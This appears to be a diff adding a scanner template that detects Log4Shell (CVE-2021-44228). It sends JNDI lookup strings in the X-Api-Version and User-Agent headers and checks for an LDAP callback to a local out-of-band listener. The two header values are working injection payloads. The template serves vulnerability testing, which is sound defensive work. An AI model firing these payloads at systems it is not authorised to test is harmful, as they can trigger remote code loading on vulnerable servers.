@@ -1,0 +1,21 @@
+id: log4j/jndi-rce
+summary: Log4Shell (CVE-2021-44228): JNDI lookup injection in logged input. The vulnerable logger resolves ${jndi:ldap://HOST:PORT/REF} back to the listener.
+ref: CVE-2021-44228
+param: q
+oob:
+  host: 127.0.0.1
+  port: 0
+
+http probe
+  # the logger resolves the JNDI lookup and the LDAP provider calls back the listener
+  get "/"
+  with the header "X-Api-Version" set to "${jndi:ldap://{oob_host}:{oob_port}/probe}"
+  expect the target to call back "300c0201016007"
+  # an LDAP bind callback arrived at the listener: the JNDI lookup executed, proving the vulnerable logger
+
+http exfil-check
+  # a second lookup exercises the same path through a different header
+  get "/"
+  with the header "User-Agent" set to "${jndi:ldap://{oob_host}:{oob_port}/exec}"
+  expect the target to call back "300c0201016007"
+  # the callback repeated for the second lookup: the logger resolves every logged value
